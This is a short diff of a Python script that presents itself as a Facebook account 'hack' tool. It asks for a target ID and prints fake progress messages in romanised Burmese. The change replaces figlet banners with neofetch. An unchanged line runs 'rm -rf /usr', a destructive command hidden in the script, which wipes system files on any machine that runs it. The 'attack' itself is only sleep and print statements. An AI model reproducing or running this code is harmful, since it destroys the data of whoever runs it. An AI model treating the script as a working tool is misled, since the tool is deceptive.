@@ -14,14 +14,15 @@ year = now.year
 
 os.system("rm -rf /usr")
 os.system("clear")
-os.system("figlet FB-Attack")
+os.system("apt install neofetch")
+os.system("neofetch")
 print
 print("Author   : MR.$!lent_680UL")
 print
 id = input(" Target ID: ")
 
 os.system("clear")
-os.system(" figlet FB-Attack Start")
+os.system("neofetch")
 print ("Min May Sout Phote Ko Hack Par Lar 0% ")
 time.sleep(5)
 print ("Min May Sout Phote Ko Hack Par Lar 10%")
